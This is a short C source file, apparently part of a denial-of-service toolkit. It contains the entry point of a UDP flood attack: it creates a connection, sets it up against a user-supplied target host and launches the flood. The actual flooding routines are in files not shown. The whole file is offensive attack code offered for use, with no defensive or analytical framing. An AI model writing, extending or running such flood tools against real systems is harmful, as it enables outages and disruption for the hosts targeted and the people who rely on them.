#include <stdio.h>

#include <lib/info.h>
#include <lib/conn.h>
#include <lib/mem.h>

#include "udp.h"
#include "flood.h"

// main singleton conneciton for the entire attack
static conn_t *conn;

// main entry point for the udp attacks
void udp_init(arguments args)
{
	// if random flag is set just alert user
	// that the UDP Flood already uses random port option
	// due to the nature of the attack
	if (args.port.random)
		STATUS("UDP-FLOOD already uses the random flag.");


	STATUS("UDP-FLOOD attack is starting.");
	conn = conn_new();

	flood_setup4(conn->c4, args.host);
	flood(conn);
	
	conn_free(conn);
}
